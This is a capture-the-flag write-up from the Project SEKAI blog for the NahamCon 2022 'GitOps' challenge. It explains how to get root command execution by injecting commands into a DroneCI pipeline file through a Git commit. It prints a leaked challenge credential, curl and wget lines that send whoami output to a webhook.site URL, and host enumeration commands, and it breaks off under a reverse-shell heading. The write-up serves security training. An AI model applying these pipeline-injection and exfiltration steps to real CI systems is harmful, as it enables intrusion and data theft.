<!DOCTYPE html><html lang="en" class="scroll-smooth"><head><link rel="apple-touch-icon" sizes="76x76" href="/static/favicons/apple-touch-icon.png?v=2"/><link rel="icon" type="image/png" sizes="32x32" href="/static/favicons/favicon-32x32.png?v=2"/><link rel="icon" type="image/png" sizes="16x16" href="/static/favicons/favicon-16x16.png?v=2"/><link rel="manifest" href="/static/favicons/site.webmanifest?v=2"/><link rel="mask-icon" href="/static/favicons/safari-pinned-tab.svg?v=2" color="#5bbad5"/><meta name="msapplication-TileColor" content="#da532c"/><meta name="theme-color" content="#ffffff"/><link rel="alternate" type="application/rss+xml" href="/feed.xml"/><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"/><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.11/dist/katex.min.css" integrity="sha384-Um5gpz1odJg5Z4HAmzPtgZKdTBHZdw8S29IecapCSB31ligYPhHQZMIlWLYQGVoc" crossorigin="anonymous"/><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin /><meta charSet="utf-8"/><script>!function(){try {var d=document.documentElement.classList;d.remove('light','dark');var e=localStorage.getItem('theme');d.add('dark');if("system"===e||(!e&&false)){var t="(prefers-color-scheme: dark)",m=window.matchMedia(t);m.media!==t||m.matches?d.add('dark'):d.add('light')}else if(e) d.add(e)}catch(e){}}()</script><meta content="width=device-width, initial-scale=1" name="viewport"/><title>NahamCon CTF 2022 – GitOps</title><meta name="robots" content="follow, index"/><meta name="description" content="Abuse the pipeline execution process to gain access to the host."/><meta property="og:url" content="https://sekai.team/blog/nahamcon-ctf-2022/gitops/"/><meta property="og:type" content="article"/><meta property="og:site_name" content="Project SEKAI"/><meta property="og:description" content="Abuse the pipeline execution process to gain access to the host."/><meta property="og:title" content="NahamCon CTF 2022 – GitOps"/><meta property="og:image" content="https://og-vercel-ruby.vercel.app/api/sekai?title=NahamCon+CTF+2022+%E2%80%93+GitOps&amp;desc=Abuse+the+pipeline+execution+process+to+gain+access+to+the+host.&amp;authors=TheButcher"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:site" content="https://twitter.com/ProjectSEKAIctf"/><meta name="twitter:title" content="NahamCon CTF 2022 – GitOps"/><meta name="twitter:description" content="Abuse the pipeline execution process to gain access to the host."/><meta name="twitter:image" content="https://og-vercel-ruby.vercel.app/api/sekai?title=NahamCon+CTF+2022+%E2%80%93+GitOps&amp;desc=Abuse+the+pipeline+execution+process+to+gain+access+to+the+host.&amp;authors=TheButcher"/><meta property="article:published_time" content="2022-05-02T00:00:00.000Z"/><link rel="canonical" href="https://sekai.team/blog/nahamcon-ctf-2022/gitops/"/><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "Article",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://sekai.team/blog/nahamcon-ctf-2022/gitops"
  },
  "headline": "NahamCon CTF 2022 – GitOps",
  "image": [
    {
      "@type": "ImageObject",
      "url": "https://og-vercel-ruby.vercel.app/api/sekai?title=NahamCon+CTF+2022+%E2%80%93+GitOps&desc=Abuse+the+pipeline+execution+process+to+gain+access+to+the+host.&authors=TheButcher"
    }
  ],
  "datePublished": "2022-05-02T00:00:00.000Z",
  "dateModified": "2022-05-02T00:00:00.000Z",
  "author": [
    {
      "@type": "Person",
      "name": "TheButcher"
    }
  ],
  "publisher": {
    "@type": "Organization",
    "name": "Project SEKAI",
    "logo": {
      "@type": "ImageObject",
      "url": "https://sekai.team/static/images/fullLogo.svg"
    }
  },
  "description": "Abuse the pipeline execution process to gain access to the host."
}</script><meta name="next-head-count" content="20"/><link rel="preload" href="/_next/static/css/206f24680f6266ec.css" as="style"/><link rel="stylesheet" href="/_next/static/css/206f24680f6266ec.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-5cd94c89d3acac5f.js"></script><script src="/_next/static/chunks/webpack-09a75c9ee2bd415e.js" defer=""></script><script src="/_next/static/chunks/main-b8c3e234d7065a2c.js" defer=""></script><script src="/_next/static/chunks/pages/_app-b8cbc7cb85baf88e.js" defer=""></script><script src="/_next/static/chunks/framework-327e104994690a53.js" defer=""></script><script src="/_next/static/chunks/29107295-a2d0c8e72019a3ed.js" defer=""></script><script src="/_next/static/chunks/545-f1dc6b53ce85b08b.js" defer=""></script><script src="/_next/static/chunks/930-1296a6163e1e3cc6.js" defer=""></script><script src="/_next/static/chunks/pages/blog/%5B...slug%5D-9a47024c9df525b8.js" defer=""></script><script src="/_next/static/0wxHpwy3ehtFejYPlY-Z7/_buildManifest.js" defer=""></script><script src="/_next/static/0wxHpwy3ehtFejYPlY-Z7/_ssgManifest.js" defer=""></script><script src="/_next/static/0wxHpwy3ehtFejYPlY-Z7/_middlewareManifest.js" defer=""></script><style data-href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap">@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/l/font?kit=UcCO3FwrK3iLTeHuS_fvQtMwCp50KnMw2boKoduKmMEVuLyfMZs&skey=c491285d6722e4fa&v=v13) format('woff')}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/l/font?kit=UcCO3FwrK3iLTeHuS_fvQtMwCp50KnMw2boKoduKmMEVuGKYMZs&skey=c491285d6722e4fa&v=v13) format('woff')}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/l/font?kit=UcCO3FwrK3iLTeHuS_fvQtMwCp50KnMw2boKoduKmMEVuFuYMZs&skey=c491285d6722e4fa&v=v13) format('woff')}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2JL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0460-052F,U+1C80-1C88,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa0ZL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2ZL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+1F00-1FFF}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa1pL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0370-0377,U+037A-037F,U+0384-038A,U+038C,U+038E-03A1,U+03A3-03FF}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2pL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa25L7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa1ZL7W0Q5nw.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2JL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0460-052F,U+1C80-1C88,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa0ZL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2ZL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+1F00-1FFF}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa1pL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0370-0377,U+037A-037F,U+0384-038A,U+038C,U+038E-03A1,U+03A3-03FF}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2pL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa25L7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa1ZL7W0Q5nw.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2JL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0460-052F,U+1C80-1C88,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa0ZL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2ZL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+1F00-1FFF}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa1pL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0370-0377,U+037A-037F,U+0384-038A,U+038C,U+038E-03A1,U+03A3-03FF}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2pL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa25L7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa1ZL7W0Q5nw.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}</style></head><body class="antialiased text-black bg-white dark:bg-gray-900 dark:text-white"><div id="__next" data-reactroot=""><div class="max-w-3xl px-4 mx-auto sm:px-6 xl:max-w-5xl xl:px-0"><div class="flex flex-col justify-between h-screen"><header class="flex items-center justify-between py-10"><div><a aria-label="Visit home page" href="/"><div class="flex items-center justify-between"><div class="mr-3"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 468.7 215.63" height="80" width="auto"><defs><linearGradient id="fullLogo_svg__linear-gradient" x1="-7051.74" y1="5608.42" x2="-7051.74" y2="5392.1" gradientTransform="matrix(1 0 .15 -.99 6503.98 5547.9)" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#00e5ea"></stop><stop offset="1" stop-color="#00b5cc"></stop></linearGradient><linearGradient id="fullLogo_svg__linear-gradient-2" x1="1498.32" y1="4428.84" x2="1497.92" y2="4311.82" gradientTransform="matrix(1 0 0 -1 -1107.01 4435.41)" xlink:href="#fullLogo_svg__linear-gradient"></linearGradient><linearGradient id="fullLogo_svg__linear-gradient-3" x1="320.76" y1="14.17" x2="320.76" y2="47.97" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#0069a5"></stop><stop offset="1" stop-color="#003d6b"></stop></linearGradient><style>.fullLogo_svg__cls-1{fill:#fff}</style></defs><g id="fullLogo_svg__Project_SEKAI_Wide_White" data-name="Project SEKAI Wide White"><path class="fullLogo_svg__cls-1" d="M107 117.14v-4c11.93 0 22.15-8.62 23.76-20l12.91-91.63h4.06l-13 92.14c-1.92 13.4-13.84 23.49-27.73 23.49Z"></path><path class="fullLogo_svg__cls-1" d="M97.43 98.3a16 16 0 0 1-16.26-18.72l8.68-61.42A21.78 21.78 0 0 1 110.77 0a16.34 16.34 0 0 1 12.57 5.5A16.36 16.36 0 0 1 127 18.72l-8.69 61.42c-1.39 10.01-10.77 18.16-20.88 18.16ZM110.77 4a17.63 17.63 0 0 0-17 14.72l-8.64 61.42a12 12 0 0 0 12.3 14.16 17.65 17.65 0 0 0 16.95-14.72l8.69-61.42a12.41 12.41 0 0 0-2.75-10A12.4 12.4 0 0 0 110.77 4ZM186.94 5.42l.56-3.91H162.99l-13.5 95.44H174l.57-4h-20.46l5.85-41.36h20.46l.56-4h-20.45l5.96-42.17h20.45zM266.73 1.51h-31.01l-.55 3.91h14.2l-12.95 91.53h4.06l12.93-91.53h12.77l.55-3.91zM212.61 1.51a15.86 15.86 0 0 0-15.24 13.24l-9.86 69.48a11.69 11.69 0 0 0 2.76 9.34 12.57 12.57 0 0 0 9.18 4.43h.2c6.38 0 11.65-5.57 15.15-9.28L211.9 86c-3.06 3.23-7.67 8.11-12.38 8a8.54 8.54 0 0 1-6.21-3 7.73 7.73 0 0 1-1.84-6.18l9.86-69.48a11.83 11.83 0 0 1 11.28-9.9h13.91l.55-3.91ZM37.08 5.58a12 12 0 0 0-9.26-4.06H13.5L0 97h4.06l6.41-45.37h10.84a15.87 15.87 0 0 0 15.24-13.29l3.25-23a12 12 0 0 0-2.72-9.76Zm-1.24 9.17-3.26 23a11.74 11.74 0 0 1-11.27 9.8H11l6-42.13h10.85a7.94 7.94 0 0 1 8 9.33ZM75.09 5.58a12 12 0 0 0-9.26-4.06h-14.3L38 97h4l6.5-45.42h10L65 96.2h4l-6.6-45a16 16 0 0 0 12.16-12.86l3.25-23a12 12 0 0 0-2.72-9.76Zm-1.24 9.17-3.25 23a11.76 11.76 0 0 1-11.28 9.8H49.07L55 5.42h10.86a7.94 7.94 0 0 1 8 9.33ZM223.75 215.47h-4.06l13.5-95.43h4.05l-13.49 95.43zM65.83 215.63a14.49 14.49 0 0 1-11-4.65 11.3 11.3 0 0 1-2.68-9.15l1.31-8.59 4.4-2.34-1.76 11.52a7.24 7.24 0 0 0 1.75 5.93 10.47 10.47 0 0 0 8 3.28c6.42 0 12.26-4.39 13-9.8l5.42-38.33-28.77 15.27 6.37-46c1-7.3 8.65-13.24 17-13.24a14.52 14.52 0 0 1 11 4.65 11.36 11.36 0 0 1 2.68 9.14l-1.2 8.68-4.35 2.34 1.64-11.6a7.29 7.29 0 0 0-1.74-6 10.5 10.5 0 0 0-8-3.28c-6.42 0-12.26 4.39-13 9.79l-5.29 38.27 28.8-15.28-6.52 46.1c-1.11 7.35-8.73 13.29-17.06 13.29ZM174.15 120.04h-4.51l-26.9 51.72 7.31-51.72H146l-13.5 95.43h4.05l4.5-31.8 10.61-20.4 12.61 52.2h4.11l-13.91-57.6 19.68-37.83zM205 215.47h4l-2.29-94.87v-.56h-4l-29.31 95.43h4.18l9.82-32h16.83Zm-16.37-36L203 132.68l1.13 46.81ZM132.58 123.94l.56-3.91h-24.52l-13.49 95.44h24.51l.56-4H99.75l5.85-41.36h20.45l.57-4h-20.46l5.97-42.17h20.45z"></path><path style="fill:url(#fullLogo_svg__linear-gradient)" d="M279.69 1.51h8.87l-32.09 213.93h-8.87L279.69 1.51z"></path><path d="M393.81 14.88C396 .34 331.4 1.5 296.53 1.5L283.6 87.67c33.36-1.94 99.5-2 97.21 13.27-1.14 7.58-5.53 7.29-6.1 11.08-1.52 10.14 70.94 5.62 81.15 4.52L434 73.6l34.7-43.29c-17.47 1.81-82.47 4.94-81.11-4.15.73-4.87 5.41-5.56 6.22-11.28Z" style="fill:url(#fullLogo_svg__linear-gradient-2)"></path><path d="m324.34 13-5.8 25.24A9.73 9.73 0 0 0 312 36c-4.66 0-8.43 2.82-8.42 6.27s3.8 6.24 8.46 6.22c4 0 7.4-2.12 8.23-4.92 0-.14.06-.28.09-.42l3.48-15.5q9.18 2.06 9.72 5.26a9 9 0 0 1-1.27 6.22 10.78 10.78 0 0 0 5.7-8.81q.48-5.88-13.65-17.32Z" style="fill:url(#fullLogo_svg__linear-gradient-3)"></path></g></svg></div></div></a></div><div class="flex items-center text-base leading-5"><div class="hidden sm:block"><a class="p-1 font-medium text-gray-900 sm:p-4 dark:text-gray-100" href="/members/">Members</a><a class="p-1 font-medium text-gray-900 sm:p-4 dark:text-gray-100" href="/contests/">Contests</a><a class="p-1 font-medium text-gray-900 sm:p-4 dark:text-gray-100" href="/blog/">Blog</a><a class="p-1 font-medium text-gray-900 sm:p-4 dark:text-gray-100" href="/tags/">Tags</a><a target="_blank" rel="noopener noreferrer" href="https://ctf.sekai.team/" class="p-1 font-medium text-gray-900 sm:p-4 dark:text-gray-100">CTF 2023</a></div><div class="sm:hidden"><button type="button" class="w-8 h-8 py-1 ml-1 mr-1 rounded" aria-label="Toggle Menu"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" class="text-gray-900 dark:text-gray-100"><path fill-rule="evenodd" d="M3 5a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 10a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 15a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1z" clip-rule="evenodd"></path></svg></button><div class="fixed w-full h-full top-24 right-0 bg-gray-200 dark:bg-gray-800 opacity-95 z-10 transform ease-in-out duration-300 translate-x-full"><button type="button" aria-label="toggle modal" class="fixed w-full h-full cursor-auto focus:outline-none"></button><nav class="fixed h-full mt-8"><div class="px-12 py-4"><a class="text-2xl font-bold tracking-widest text-gray-900 dark:text-gray-100" href="/members/">Members</a></div><div class="px-12 py-4"><a class="text-2xl font-bold tracking-widest text-gray-900 dark:text-gray-100" href="/contests/">Contests</a></div><div class="px-12 py-4"><a class="text-2xl font-bold tracking-widest text-gray-900 dark:text-gray-100" href="/blog/">Blog</a></div><div class="px-12 py-4"><a class="text-2xl font-bold tracking-widest text-gray-900 dark:text-gray-100" href="/tags/">Tags</a></div><div class="px-12 py-4"><a target="_blank" rel="noopener noreferrer" href="https://ctf.sekai.team/" class="text-2xl font-bold tracking-widest text-gray-900 dark:text-gray-100">CTF 2023</a></div></nav></div></div></div></header><main class="mb-auto"><div class="max-w-3xl px-4 mx-auto sm:px-6 xl:max-w-5xl xl:px-0"><article><div class="xl:divide-y xl:divide-gray-200 xl:dark:divide-gray-700"><header class="pt-6 xl:pb-6"><div class="space-y-1 text-center"><dl class="space-y-10"><div><dt class="sr-only">Published on</dt><dd class="text-base font-medium leading-6 text-gray-500 dark:text-gray-400"><time dateTime="2022-05-02T00:00:00.000Z">Monday, 2 May 2022</time></dd></div></dl><div><h1 class="text-3xl font-extrabold leading-9 tracking-tight text-gray-900 dark:text-gray-100 sm:text-4xl sm:leading-10 md:text-5xl md:leading-14">NahamCon CTF 2022 – GitOps</h1></div></div></header><div class="pb-8 divide-y divide-gray-200 xl:divide-y-0 dark:divide-gray-700 xl:grid xl:grid-cols-4 xl:gap-x-6" style="grid-template-rows:auto 1fr"><dl class="pt-6 pb-10 xl:pt-11 xl:border-b xl:border-gray-200 xl:dark:border-gray-700"><dt class="sr-only">Authors</dt><dd><ul class="flex justify-center space-x-8 xl:block sm:space-x-12 xl:space-x-0 xl:space-y-8"><li class="flex items-center space-x-2"><img src="https://www.gravatar.com/avatar/711bcc9351488f059a9973474447df76?d=identicon&amp;s=256" width="38px" height="38px" alt="avatar" class="w-10 h-10 rounded-full"/><dl class="text-sm font-medium leading-5 whitespace-nowrap"><dt class="sr-only">Name</dt><dd class="text-gray-900 dark:text-gray-100">TheButcher</dd><dt class="sr-only">Twitter</dt><dd><span class="text-gray-500">Always Try Harder</span></dd></dl></li></ul></dd></dl><div class="divide-y divide-gray-200 dark:divide-gray-700 xl:pb-0 xl:col-span-3 xl:row-span-2"><div class="pt-10 pb-8 prose dark:prose-dark max-w-none"><h1 id="gitops"><a href="#gitops" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>GitOps</h1>
<blockquote>
<p>Challenge Author: @congon4tor#2334</p>
<p>Someone leaked their git credentials (<code>developer:2!W4S5J$6e</code>). How deep can you infiltrate?</p>
<p>This challenge uses vhosts.<br/>
<!-- -->Visit git.challenge.nahamcon.com:[YOUR_PORT]<br/>
<!-- -->Visit drone.challenge.nahamcon.com:[YOUR_PORT]<br/>
<!-- -->Visit web.challenge.nahamcon.com:[YOUR_PORT]</p>
</blockquote>
<h2 id="challenge-summary"><a href="#challenge-summary" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Challenge Summary</h2>
<p>In this challenge, we are given 3 different services to attack. There is an automated process that pushes the Master Branch of the Git Repository to the main webserver of the organisation. To complete this challenge, we will need to create a new commit with a modified DroneCI configuration file to abuse the pipeline execution process to gain access to the host running DroneCI and Gitea. Once on that host, we can find some credentials for another user allowed to review codes written by peers. With these information, we can inject malicious code in <code>index.php</code> by creating a new commit with the developer account and use the DroneCI account to approve and merge the malicious commit on the Master Branch. Our malicious Master Branch will then be pushed to the WebServer, and we are now able to gain code execution and grab the flag.</p>
<h2 id="initial-reconnaissance"><a href="#initial-reconnaissance" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Initial Reconnaissance</h2>
<ul>
<li>
<p><code>Git.challenge.nahamcon.com</code></p>
<ul>
<li>
<p>We can confirm that the application version with the page footer: <em>Powered by Gitea Version: 1.16.0</em></p>
</li>
<li>
<p>We have valid credentials given by the challenge creator <code>developer:2!W4S5J$6e</code></p>
</li>
<li>
<p>Once loggedIn, we have access to only 1 private repository, there is no public one, and we cannot create a new one <em>(Limit set to 0)</em></p>
</li>
</ul>
<p><img src="/static/images/nahamcon-ctf-2022/gitops/repository.png" alt="Web Repository main page"/>
<img src="/static/images/nahamcon-ctf-2022/gitops/readme.png" alt="ReadMe Screenshot"/></p>
</li>
<li>
<p><code>Drone.challenge.nahamcon.com</code></p>
<p>After some quick research, we can understand that drone is the application that automates the process to keep the webserver up to date.</p>
<blockquote>
<p>Drone by Harness™ is a modern Continuous Integration platform that empowers busy teams to automate their build, test and release workflows using a powerful, cloud native pipeline engine. <em><a target="_blank" rel="noopener noreferrer" href="https://docs.drone.io/">https://docs.drone.io/</a></em></p>
</blockquote>
<ul>
<li>
<p>Navigating the docs, we found an interesting feature, <a target="_blank" rel="noopener noreferrer" href="https://docs.drone.io/pipeline/exec/overview/"><strong>Exec Pipeline</strong></a>.</p>
</li>
</ul>
<blockquote>
<p>An exec pipeline executes shell commands directly on the host machine without isolation. This is useful for workloads that need to run on the host, or are poorly suited for execution inside containers.</p>
</blockquote>
<ul>
<li>The <code>Drone.yml</code> file in the web repository is probably the drone config file. And from the <code>README.md</code> we can assume it gets run when we make a pull request to ensure our new code passes all the required checks.</li>
</ul>
</li>
<li>
<p><code>Web.challenge.nahamcon.com</code></p>
<ul>
<li>
<p>This is the webserver, in the <code>ReadMe.md</code> from the Web repository, we learned that every minute, the GitOps system will push the <code>master</code> branch to this server.</p>
<blockquote>
<p>Our gitops system will pull your changes every minute and update the website automatically.</p>
</blockquote>
</li>
<li>
<p>We can assume this is the server containing the flag.</p>
</li>
</ul>
</li>
</ul>
<h2 id="testing-for-remote-code-execution"><a href="#testing-for-remote-code-execution" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Testing for Remote Code Execution</h2>
<p>In our initial test, we tried to contact a webhook from <a target="_blank" rel="noopener noreferrer" href="https://webhook.site/">https://webhook.site/</a>. We added the following code to <code>drone.yml</code>.</p>
<div class="relative"><pre><code class="language-yaml code-highlight"><span class="code-line"><span class="token comment"># ...</span>
</span><span class="code-line">      <span class="token punctuation">-</span> curl https<span class="token punctuation">:</span>//webhook.site/2289b2a6<span class="token punctuation">-</span>580c<span class="token punctuation">-</span>4091<span class="token punctuation">-</span>90a4<span class="token punctuation">-</span>4356e97c6fc0/$(whoami)
</span><span class="code-line">      <span class="token punctuation">-</span> wget https<span class="token punctuation">:</span>//webhook.site/2289b2a6<span class="token punctuation">-</span>580c<span class="token punctuation">-</span>4091<span class="token punctuation">-</span>90a4<span class="token punctuation">-</span>4356e97c6fc0/$(whoami)
</span></code></pre></div>
<p><img src="/static/images/nahamcon-ctf-2022/gitops/drone_whoami.png" alt="Initial Testing"/></p>
<p><strong>Note:</strong> We inserted a request with <code>curl</code> and with <code>wget</code> in case one of them is not installed on the system.</p>
<p>We can now check our webhook to see if the commands were successfully executed, and we can see two new requests, one with <code>curl</code> and one with <code>wget</code>. It worked, and we even have root privileges over the target machine!</p>
<p><img src="/static/images/nahamcon-ctf-2022/gitops/webhook_whoami.png" alt="Webhook.site Result"/></p>
<h2 id="bonus-how-to-get-command-output-without-webhook"><a href="#bonus-how-to-get-command-output-without-webhook" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Bonus: How to get command output without webhook</h2>
<p>In this challenge, the target machine is connected to internet, but what if it was only accessible within the local network, or if it had a very strict firewall policy and you can’t exfiltrate data via the WAN network ?</p>
<p>This is where the drone application can help us, when we access the Drone web UI, we can see the result of our command in the output log.</p>
<p><img src="/static/images/nahamcon-ctf-2022/gitops/output_whoami.png" alt="DroneCI output for initial testing"/></p>
<p>We could do all our enumeration processes and root the target box this way, but it would be quite repetitive to create a new commit for each command then go to DroneCI to check the output...</p>
<h2 id="getting-reverse-shell"><a href="#getting-reverse-shell" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Getting Reverse shell</h2>
<p>We will reproduce the same steps as the <code>whoami</code> command execution, but instead, we used some simple commands to gather more information about the target system.</p>
<div class="relative"><pre><code class="language-yaml code-highlight"><span class="code-line"><span class="token key atrule">steps</span><span class="token punctuation">:</span>
</span><span class="code-line">  <span class="token punctuation">-</span> <span class="token key atrule">name</span><span class="token punctuation">:</span> linting
</span><span class="code-line">    <span class="token key atrule">commands</span><span class="token punctuation">:</span>
</span><span class="code-line">      <span class="token punctuation">-</span> phplint <span class="token punctuation">-</span><span class="token punctuation">-</span>lint .
</span><span class="code-line">      <span class="token punctuation">-</span> uname <span class="token punctuation">-</span>a
</span><span class="code-line">      <span class="token punctuation">-</span> cat /etc/issue
</span><span class="code-line">      <span class="token punctuation">-</span> find $(echo $PATH <span class="token punctuation">|</span> sed &#x27;s/<span class="token punctuation">:</span>/ /g&#x27;)
</span><span class="code-line">      <span class="token punctuation">-</span> find / <span class="token punctuation">-</span>perm /o+w <span class="token punctuation">-</span>type d
</span></code></pre></div>
